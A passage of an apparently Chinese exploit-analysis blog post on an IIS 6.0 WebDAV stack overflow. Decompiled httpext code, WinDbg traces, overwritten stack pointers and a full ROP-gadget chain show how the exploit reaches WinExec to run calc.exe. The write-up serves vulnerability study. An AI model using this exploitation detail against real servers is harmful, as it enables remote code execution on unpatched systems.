( v33 )</span><br><span class="line">    &#123;</span><br><span class="line">      v20 = *v33;</span><br><span class="line">      *v33 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v20 )</span><br><span class="line">        CRefCountedObject::Release(v20);</span><br><span class="line">    &#125;</span><br><span class="line">    result = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v21 = v35;</span><br><span class="line">    v22 = v16;</span><br><span class="line">    v23 = <span class="number">2</span> * v16;</span><br><span class="line">    v24 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(<span class="number">2</span> * v16) &gt;&gt; <span class="number">2</span>;</span><br><span class="line">    qmemcpy(v35, &amp;v40, <span class="number">4</span> * v24);</span><br><span class="line">      [...]</span><br></pre></td></tr></table></figure>

<p>经过分析<code>v27</code>初始为<code>0x82</code>是因为<code>CStackBuffer&lt;unsigned short,260&gt;::resize</code>函数中计算初始值为<code>0x412</code>，并在使用前对其进行右移3位,得到<code>0x82</code></p>
<p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/2017_7269_5.png" alt></p>
<p>因此，第一次进入<code>ScStoragePathFromUrl</code>函数时<code>URL</code>长度大于<code>0x82</code>并不会执行<code>qmemcpy</code>操作，而是将<code>URL</code>转换成物理路径后传回其字符数</p>
<p>在<code>HrCheckIfHeader</code>函数第二次对<code>ScStoragePathFromUrl</code>函数进行调用时，重新调用<code>CStackBuffer</code>分配内存，传入的长度是第一次执行<code>ScStoragePathFromUrl</code>回传的长度，而第一次回传的长度是字符数，但是调用<code>CStackBuffer</code>时将其当为字节数传入，也就是这里分配内存过小导致了栈溢出</p>
<p><code>CStackBuffer&lt;ushort,260&gt;::resize</code>中可以看到，当字符数小于<code>260</code>时，不会调用<code>ExAlloc</code>分配堆内存，而是直接使用栈空间，这样就会导致栈溢出</p>
<p>两次调用<code>CStackBuffer&lt;ushort,260&gt;::resize</code>函数所传入的缓冲区地址在栈中的布局如下    </p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> v28[<span class="number">260</span>]; <span class="comment">// [esp+44h] [ebp-430h] BYREF			buffer2</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v29; <span class="comment">// [esp+148h] [ebp-32Ch]			size2</span></span><br><span class="line"><span class="keyword">wchar_t</span> *<span class="keyword">String</span>; <span class="comment">// [esp+14Ch] [ebp-328h]				buffer2 ptr</span></span><br><span class="line">_DWORD v31[<span class="number">66</span>]; <span class="comment">// [esp+150h] [ebp-324h] BYREF		buffer1 66*4=264</span></span><br><span class="line"><span class="keyword">unsigned</span> __int16 *v32; <span class="comment">// [esp+258h] [ebp-21Ch]		size1</span></span><br><span class="line"><span class="keyword">wchar_t</span> String1[<span class="number">260</span>]; <span class="comment">// [esp+25Ch] [ebp-218h] BYREF	buffer1</span></span><br></pre></td></tr></table></figure>

<p>而<code>CStackBuffer&lt;ushort,260&gt;::resize</code>函数中的<code>this[65]</code>、<code>this[66]</code>，通过分析反汇编代码可以看到与HrCheckIfHeader函数变量对应关系如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:673E5EFC                 mov     esi, ecx</span><br><span class="line">...</span><br><span class="line">.text:673E5F33                 mov     [esi+108h], eax;this[66]</span><br><span class="line">.text:673E5F39                 mov     eax, [esi+104h];this[65]</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="center">CStackBuffer::resize</th>
<th align="center">HrCheckIfHeader</th>
<th align="center">HrCheckIfHeader</th>
</tr>
</thead>
<tbody><tr>
<td align="center">this</td>
<td align="center">v31</td>
<td align="center">v28</td>
</tr>
<tr>
<td align="center">this[65]</td>
<td align="center">v31[65]</td>
<td align="center">v29</td>
</tr>
<tr>
<td align="center">this[66]</td>
<td align="center">v32</td>
<td align="center">String</td>
</tr>
</tbody></table>
<p>而<code>HrCheckIfHeader</code>函数在调用<code>CStackBuffer</code>初始化时已经将<code>String</code>指向了<code>v28</code>，<code>v32</code>指向了<code>v31</code>,因此调用<code>ScStoragePathFromUrl</code>函数时，默认向<code>[ebp-430h]</code>拷贝内容</p>
<p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/2017_7269_6.png" alt></p>
<p>栈布局结构大致如下</p>
<p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/2017_7269_7.png" alt></p>
<h4 id="EXP分析"><a href="#EXP分析" class="headerlink" title="EXP分析"></a>EXP分析</h4><p>执行EXP时，第一次调用<code>ScStoragePathFromUrl</code>回传长度为<code>0xaa</code>小于<code>0x104</code>，那么第二次调用<code>CStackBuffer&lt;ushort,260&gt;::resize</code>无需使用<code>ExAlloc</code>分配堆，直接使用栈，而实际需要的空间为<code>0xaa*2=0x154</code></p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">0:007&gt; u</span><br><span class="line">httpext!HrCheckIfHeader+0x11f:</span><br><span class="line">673f5445 e80740ffff      call    httpext!CMethUtil::ScStoragePathFromUrl (673e9451)</span><br><span class="line">673f544a 8bf0            mov     esi,eax</span><br><span class="line">[...]</span><br><span class="line">0:007&gt; dd ebp-434 L4</span><br><span class="line">012bf800  00000082 00000000 00000000 00000000</span><br><span class="line">0:007&gt; p</span><br><span class="line">eax=00000001 ebx=01e8f248 ecx=000045a9 edx=00000154 esi=00000000 edi=77ba8ef2</span><br><span class="line">eip=673f544a esp=012bf7c0 ebp=012bfc34 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">httpext!HrCheckIfHeader+0x124:</span><br><span class="line">673f544a 8bf0            mov     esi,eax</span><br><span class="line">0:007&gt; dd ebp-434 L4</span><br><span class="line">012bf800  000000aa 00000000 00000000 00000000</span><br></pre></td></tr></table></figure>

<p>而<code>v28</code>预留栈空间只有<code>0x104</code>个字节，因此第二次调用<code>ScStoragePathFromUrl</code>将<code>v28[260]</code>之后的内容进行覆盖，即<code>ebp-32C(v29)</code>覆盖为<code>0x02020202</code>，<code>ebp-328</code>覆盖为<code>0x680312c0(String)</code>，而<code>URL</code>长度又不足以覆盖到<code>ebp</code>，因此不会触发栈溢出保护</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">0:007&gt; u</span><br><span class="line">httpext!HrCheckIfHeader+0x159:</span><br><span class="line">673f547f e8cd3fffff      call    httpext!CMethUtil::ScStoragePathFromUrl (673e9451)</span><br><span class="line">673f5484 8bf0            mov     esi,eax</span><br><span class="line">[...]</span><br><span class="line">0:007&gt; dd ebp-32c L8</span><br><span class="line">012bf908  00000412 012bf804 673e205b 00000013</span><br><span class="line">012bf918  012bf9c0 673f87e7 00000000 000000f0</span><br><span class="line">0:007&gt; p</span><br><span class="line">eax=00000000 ebx=01e8f248 ecx=000045a9 edx=012bf804 esi=00000001 edi=77ba8ef2</span><br><span class="line">eip=673f5484 esp=012bf7c0 ebp=012bfc34 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">httpext!HrCheckIfHeader+0x15e:</span><br><span class="line">673f5484 8bf0            mov     esi,eax</span><br><span class="line">0:007&gt; dd ebp-32c L8</span><br><span class="line">012bf908  02020202 680312c0 52566c44 6c6d4b37</span><br><span class="line">012bf918  585a4f58 496a7950 4a52584f 664d4150</span><br></pre></td></tr></table></figure>

<p>地址 <code>0x680312c0</code> 位于 <code>rsaenh</code> 模块中，具备 <code>PAGE_READWRITE</code> 属性</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">0:019&gt; !address 680312c0                                  </span><br><span class="line">Failed to map Heaps (error 80004005)</span><br><span class="line">Usage:                  Image</span><br><span class="line">Allocation Base:        68000000</span><br><span class="line">Base Address:           68030000</span><br><span class="line">End Address:            68032000</span><br><span class="line">Region Size:            00002000</span><br><span class="line">Type:                   01000000	MEM_IMAGE</span><br><span class="line">State:                  00001000	MEM_COMMIT</span><br><span class="line">Protect:                00000004	PAGE_READWRITE</span><br><span class="line">More info:              lmv m rsaenh</span><br><span class="line">More info:              !lmi rsaenh</span><br><span class="line">More info:              ln 0x680312c0</span><br></pre></td></tr></table></figure>

<p>在第二次进入循环解析 <code>http://localhost/bbbbbbb......</code> 时，由于之前缓存的<code>0x02020202</code>导致计算结构变成了<code>00404040</code>(右移三位)</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0:007&gt; dd ebp-434</span><br><span class="line">012bf800  00404040 003a0063 0069005c 0065006e</span><br><span class="line">012bf810  00700074 00620075 0077005c 00770077</span><br><span class="line">012bf820  006f0072 0074006f 0061005c 00610061</span><br><span class="line">012bf830  00610061 00610061 78636f68 71337761</span><br><span class="line">012bf840  47726936 4b777a39 75534f70 48687a4f</span><br><span class="line">012bf850  6d545663 39536845 5567506c 33646763</span><br><span class="line">012bf860  78454630 54316952 6a514c58 42317241</span><br><span class="line">012bf870  58507035 6c473664 546a3539 54435034</span><br></pre></td></tr></table></figure>

<p>也就是说只需调用一次<code>ScStoragePathFromUrl</code>，数据将被填充到地址 <code>0x680312c0</code></p>
<p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/2017_7269_8.png" alt></p>
<p>这里发现数据将被以宽字节的形式填充，在<code>HrCheckIfHeader</code>函数中存在调用<code>CRequest::LpwszGetHeader</code>函数，而<code>CRequest::LpwszGetHeader</code>中存在<code>MultiByteToWideChar</code>函数(该函数映射一个字符串到一个<code>unicode</code>的字符串)，因此在编写<code>shellcode</code>时需要对<code>shellcode</code>进行编码转换</p>
<p>在函数 <code>HrCheckIfHeader</code> 之后会调用<code>FGetLockHandle</code>函数，<code>FGetLockHandle</code>中存在<code>CParseLockTokenHeader::HrGetLockIdForPath</code> 函数</p>
<p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/2017_7269_9.png" alt></p>
<p><code>CParseLockTokenHeader::HrGetLockIdForPath</code> 函数存在多次调用 <code>CMethUtil::ScStoragePathFromUrl</code></p>
<p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/2017_7269_10.png" alt></p>
<p>与 <code>HrCheckIfHeader</code> 相似，解析<code>URL</code> 第一部分（<code>http://localhost/aaaaaaa....</code>）时完成栈溢出，此时会覆盖到一个引用 <code>CMethUtil</code> 对象的局部变量，缓冲区地址在栈中的布局如下    </p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">wchar_t</span> *String1; <span class="comment">// [esp+3Ch] [ebp-230h]</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v26; <span class="comment">// [esp+40h] [ebp-22Ch] BYREF</span></span><br><span class="line">_DWORD v27[<span class="number">66</span>]; <span class="comment">// [esp+44h] [ebp-228h] BYREF</span></span><br><span class="line"><span class="keyword">unsigned</span> __int16 *v28; <span class="comment">// [esp+14Ch] [ebp-120h]</span></span><br><span class="line"><span class="keyword">wchar_t</span> *v29[<span class="number">66</span>]; <span class="comment">// [esp+150h] [ebp-11Ch] BYREF</span></span><br><span class="line"><span class="keyword">wchar_t</span> *<span class="keyword">String</span>; <span class="comment">// [esp+258h] [ebp-14h]</span></span><br><span class="line"><span class="keyword">int</span> v31; <span class="comment">// [esp+268h] [ebp-4h]</span></span><br></pre></td></tr></table></figure>

<p>同样地，函数在调用<code>CStackBuffer</code>初始化时已经将<code>String</code>指向了<code>v29</code>，<code>CStackBuffer::release</code>变量来源对应关系如下</p>
<table>
<thead>
<tr>
<th align="center">CStackBuffer::resize</th>
<th align="center">HrGetLockIdForPath</th>
<th align="center">HrGetLockIdForPath</th>
</tr>
</thead>
<tbody><tr>
<td align="center">this</td>
<td align="center">v27</td>
<td align="center">v29</td>
</tr>
<tr>
<td align="center">this[65]</td>
<td align="center">v27[65]</td>
<td align="center">v29[65]</td>
</tr>
<tr>
<td align="center">this[66]</td>
<td align="center">v28</td>
<td align="center">String</td>
</tr>
</tbody></table>
<p>与第一轮溢出逻辑相同，这里在覆盖局部栈空间时覆盖了一个后续会用到的<code>CparseLockTokenHeader</code>  对象的成员变量，程序只有在函数返回时, 才会去检查<code>Security Cookie</code>，如果在函数返回之前劫持了<code>EIP</code>，<code>shellcode</code>将会预期执行</p>
<p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/2017_7269_11.png" alt></p>
<p>覆盖前</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">007</span>&gt; dds ebp</span><br><span class="line"><span class="number">012b</span>fbd0  <span class="number">012b</span>fc3c</span><br><span class="line"><span class="number">012b</span>fbd4  <span class="number">673</span>eaba9 httpext!FGetLockHandle+<span class="number">0x40</span></span><br><span class="line"><span class="number">012b</span>fbd8  <span class="number">01e8</span>cb16</span><br><span class="line"><span class="number">012b</span>fbdc  <span class="number">80000000</span></span><br><span class="line"><span class="number">012b</span>fbe0  <span class="number">012b</span>fc28</span><br><span class="line"><span class="number">012b</span>fbe4  <span class="number">00000000</span></span><br><span class="line"><span class="number">012b</span>fbe8  <span class="number">01e8</span>f248</span><br><span class="line"><span class="number">012b</span>fbec  <span class="number">01e8</span>f780</span><br><span class="line"><span class="number">012b</span>fbf0  <span class="number">01e8</span>f780</span><br><span class="line"><span class="number">012b</span>fbf4  <span class="number">00000000</span></span><br><span class="line"><span class="number">012b</span>fbf8  <span class="number">00000000</span></span><br><span class="line"><span class="number">012b</span>fbfc  <span class="number">00000000</span></span><br><span class="line"><span class="number">012b</span>fc00  <span class="number">00000040</span></span><br><span class="line"><span class="number">012b</span>fc04  <span class="number">00000000</span></span><br><span class="line"><span class="number">012b</span>fc08  <span class="number">012b</span>fc29</span><br></pre></td></tr></table></figure>

<p>覆盖后</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">007</span>&gt; dds ebp</span><br><span class="line"><span class="number">012b</span>fbd0  <span class="number">4</span>a52584f</span><br><span class="line"><span class="number">012b</span>fbd4  <span class="number">664</span>d4150</span><br><span class="line"><span class="number">012b</span>fbd8  <span class="number">680313</span>c0 rsaenh!g_pfnFree+<span class="number">0x104</span></span><br><span class="line"><span class="number">012b</span>fbdc  <span class="number">65314834</span></span><br><span class="line"><span class="number">012b</span>fbe0  <span class="number">6e666</span>f43</span><br><span class="line"><span class="number">012b</span>fbe4  <span class="number">436</span>c7441</span><br><span class="line"><span class="number">012b</span>fbe8  <span class="number">680313</span>c0 rsaenh!g_pfnFree+<span class="number">0x104</span></span><br><span class="line"><span class="number">012b</span>fbec  <span class="number">6</span>a415343</span><br><span class="line"><span class="number">012b</span>fbf0  <span class="number">33307052</span></span><br><span class="line"><span class="number">012b</span>fbf4  <span class="number">424</span>c5866</span><br><span class="line"><span class="number">012b</span>fbf8  <span class="number">6346704b</span></span><br><span class="line"><span class="number">012b</span>fbfc  <span class="number">79415173</span></span><br><span class="line"><span class="number">012b</span>fc00  <span class="number">4</span>a6c7a50</span><br><span class="line"><span class="number">012b</span>fc04  <span class="number">0000003</span>e</span><br><span class="line"><span class="number">012b</span>fc08  <span class="number">012b</span>fc29</span><br></pre></td></tr></table></figure>

<p>栈地址<code>012bfbe8</code>被填充为<code>680313c0</code></p>
<p>在<code>012bfbe8</code>下硬件写入断点,在<code>CParseLockTokenHeader+0x13</code>断下</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">0:007&gt; ba w1 012bfbe8</span><br><span class="line">0:007&gt; pc</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">eax=01e8f248 ebx=00000000 ecx=012bfbec edx=012bfc68 esi=012bfbe8 edi=80000000</span><br><span class="line">eip=673e860b esp=012bfbd0 ebp=012bfbd8 iopl=0         nv up ei pl nz ac pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216</span><br><span class="line">httpext!CParseLockTokenHeader::CParseLockTokenHeader+0x13:</span><br><span class="line">673e860b e8eee00000      call    httpext!HDRITER<span class="emphasis">_TEMPLATE&lt;char&gt;::HDRITER_</span>TEMPLATE<span class="xml"><span class="tag">&lt;<span class="name">char</span>&gt;</span></span> (673f66fe)</span><br><span class="line">0:007&gt; kb</span><br><span class="line">ChildEBP RetAddr  Args to Child              </span><br><span class="line">012bfbd8 673eab84 01e8f248 01e8f780 01e8f248 httpext!CParseLockTokenHeader::CParseLockTokenHeader+0x13</span><br><span class="line">012bfc3c 673ef68e 01e8f248 01e8cb16 80000000 httpext!FGetLockHandle+0x1b</span><br><span class="line">012bfc78 673ef7c5 01e8f298 012bfcd4 674104e2 httpext!CPropFindRequest::Execute+0x125</span><br></pre></td></tr></table></figure>

<p><code>FGetLockHandle</code>函数中将<code>012bfbe8</code>作为<code>CParseLockTokenHeader</code>对象成员的指针地址</p>
<p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/2017_7269_12.png" alt></p>
<p>在解析 <code>URL</code> 第二部分（<code>http://localhost/bbbbbbb....</code>）时，<code>ScStoragePathFromUrl</code>中的 <code>ScStripAndCheckHttpPrefix</code>函数通过寄存器+偏移的方式调用<code>CParseLockTokenHeader</code>对象</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:674035E5                 push    edi</span><br><span class="line">.text:674035E6                 mov     edi, ecx;012bfbe8 </span><br><span class="line">.text:674035E8                 mov     eax, [edi];680313c0</span><br><span class="line">.text:674035EA                 lea     ecx, [ebp+String1]</span><br><span class="line">.text:674035ED                 push    ecx</span><br><span class="line">.text:674035EE                 mov     ecx, edi</span><br><span class="line">.text:674035F0                 mov     [ebp+var_C], edx</span><br><span class="line">.text:674035F3                 call    dword ptr [eax+24h];680313c0+24h</span><br><span class="line">.text:674035F6                 mov     ebx, eax</span><br></pre></td></tr></table></figure>

<p>此时<code>call</code>会跳转到<code>680313c0+24</code>处所存的地址<code>68016082</code>,经过一系列<code>ROP</code>创建<code>calc.exe</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0:007&gt; u</span><br><span class="line">httpext!ScStripAndCheckHttpPrefix+0x1e:</span><br><span class="line">674035f3 ff5024          call    dword ptr [eax+24h]</span><br><span class="line">674035f6 8bd8            mov     ebx,eax</span><br><span class="line">0:007&gt; r eax</span><br><span class="line">eax&#x3D;680313c0</span><br></pre></td></tr></table></figure>

<p><code>ROP</code>代码拼接</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">68016082 8be1            mov     esp,ecx;680313c0</span><br><span class="line">68016084 8b08            mov     ecx,dword ptr [eax];680313c0</span><br><span class="line">68016086 8b4004          mov     eax,dword ptr [eax+4];68006e4f</span><br><span class="line">68016089 50              push    eax</span><br><span class="line">6801608a c3              ret;jmp 68006e4f</span><br><span class="line">[...]</span><br><span class="line">68006e4f 5e              pop     esi;680313c0</span><br><span class="line">68006e50 5d              pop     ebp;68006e4f</span><br><span class="line">68006e51 c22000          ret     20h;jmp 68006e4f</span><br><span class="line">[...]</span><br><span class="line">68006e4f 5e              pop     esi;4d47747a</span><br><span class="line">68006e50 5d              pop     ebp;57574459</span><br><span class="line">68006e51 c22000          ret     20h;jmp 6800b113</span><br><span class="line">[...]</span><br><span class="line">6800b113 6a40            push    40h</span><br><span class="line">6800b115 eb0e            jmp     rsaenh!GetHashLength+0x39 (6800b125)</span><br><span class="line">[...]</span><br><span class="line">6800b125 58              pop     eax;40</span><br><span class="line">6800b126 5d              pop     ebp;68031434</span><br><span class="line">6800b127 c20400          ret     4</span><br><span class="line">[...]</span><br><span class="line">680129e7 c9              leave;esp&#x3D;68031438</span><br><span class="line">680129e8 c3              ret</span><br><span class="line">[..]</span><br><span class="line">68006e05 8d65e0          lea     esp,[ebp-20h];680313fc</span><br><span class="line">68006e08 5f              pop     edi;680124e3</span><br><span class="line">68006e09 5e              pop     esi;68031460</span><br><span class="line">68006e0a 5b              pop     ebx;7ffe0300</span><br><span class="line">68006e0b c9              leave;esp&#x3D;68031420,ebp&#x3D;680129e7</span><br><span class="line">68006e0c c22400          ret     24h</span><br><span class="line">[...]</span><br><span class="line">68009391 58              pop     eax;68008246</span><br><span class="line">68009392 5d              pop     ebp;32534877</span><br><span class="line">68009393 c20400          ret     4</span><br><span class="line">[...]</span><br><span class="line">68021daa 8b8010010000    mov     eax,dword ptr [eax+110h];8f</span><br><span class="line">68021db0 5d              pop     ebp;680313f8</span><br><span class="line">68021db1 c20400          ret     4</span><br><span class="line">[...]</span><br><span class="line">680129e7 c9              leave;esp&#x3D;680313fc,ebp&#x3D;6e6f3176</span><br><span class="line">680129e8 c3              ret</span><br><span class="line">[...]</span><br><span class="line">680124e3 ff23            jmp     dword ptr [ebx];7ffe0300</span><br><span class="line">[...]</span><br><span class="line">7c9585e8 8bd4            mov     edx,esp;68031400</span><br><span class="line">7c9585ea 0f34            sysenter;NtProtectVirtualMemory </span><br><span class="line">[...]</span><br><span class="line">68031460 56              push    esi;68031460</span><br><span class="line">68031461 005600          add     byte ptr [esi],dl;00560056</span><br><span class="line">68031464 59              pop     ecx;68031460</span><br><span class="line">68031465 004100          add     byte ptr [ecx],al;00560056 </span><br><span class="line">68031468 3400            xor     al,0</span><br><span class="line">6803147c 51              push    ecx;68031460</span><br><span class="line">6803147d 004100          add     byte ptr [ecx],al;00560056</span><br><span class="line">68031480 54              push    esp;68031400</span><br><span class="line">....................</span><br><span class="line">680315f7 59              pop     ecx;68031614</span><br><span class="line">680315f8 5a              pop     edx;876f8b31</span><br><span class="line">680315f9 51              push    ecx;</span><br><span class="line">680315fa ffe0            jmp     eax;7c86411e WinExec(68031633,00000001)</span><br></pre></td></tr></table></figure>

<p>梳理利用思路：</p>
<ul>
<li><p>第一轮溢出(<code>HrCheckIfHeader</code>)</p>
<ul>
<li><p>第一次进入<code>while</code>循环(循环用来遍历请求包中的URL个数)</p>
<ul>
<li>调用<code>ScStoragePathFromUrl</code>返回路径长度</li>
<li>调用<code>ScStoragePathFromUrl</code>利用溢出覆盖<code>String</code>指向可利用的缓冲区地址(<code>0x680312c0</code>)</li>
</ul>
</li>
<li><p>第二次进入<code>while</code>循环</p>
<ul>
<li>调用<code>ScStoragePathFromUrl</code>将<code>shellcode</code>写入<code>0x680312c0</code>(判断缓存长度为<code>0x404040</code>，不需要分配新的缓冲区,且只需要调用一次<code>ScStoragePathFromUrl</code>)</li>
</ul>
</li>
</ul>
</li>
<li><p>第二轮溢出(<code>HrGetLockIdForPath</code>)</p>
<ul>
<li><p>第一次进入<code>while</code>循环</p>
<ul>
<li><p>调用<code>ScStoragePathFromUrl</code>返回路径长度</p>
</li>
<li><p>调用<code>ScStoragePathFromUrl</code>利用溢出覆盖<code>String</code>指向可利用的缓冲区地址(<code>0x680312c0</code>)，覆盖引用<code>CMethUtil</code>  对象的局部变量</p>
</li>
</ul>
</li>
<li><p>第二次进入<code>while</code>循环</p>
<ul>
<li>调用<code>ScStoragePathFromUrl</code>，<code>ScStripAndCheckHttpPrefix</code>函数调用<code>680313c0+24</code>开始<code>ROP</code>并执行<code>shellcode</code></li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="实现步骤"><a href="#实现步骤" class="headerlink" title="实现步骤"></a>实现步骤</h4><hr>
<p>第一次调用<code>ScStoragePathFromUrl</code></p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0:007&gt; dd ebp-328</span><br><span class="line">012bf90c  012bf804 673e205b 00000013 012bf9c0</span><br><span class="line">012bf91c  673f87e7 00000000 000000f0 00000013</span><br><span class="line">012bf92c  00000000 01e8df34 673f87fc 012bf9d0</span><br><span class="line">012bf93c  752d6669 646f6d6e 65696669 69732d64</span><br><span class="line">012bf94c  0065636e 00000000 01e80178 00000000</span><br><span class="line">012bf95c  00000000 01e80608 00000108 0000fee8</span><br><span class="line">012bf96c  012bf984 5a63210d 013448c8 012bfa54</span><br><span class="line">012bf97c  01e8c078 012bf998 012bf9b0 5a5c1367</span><br></pre></td></tr></table></figure>

<p>第二次调用<code>ScStoragePathFromUrl</code></p>
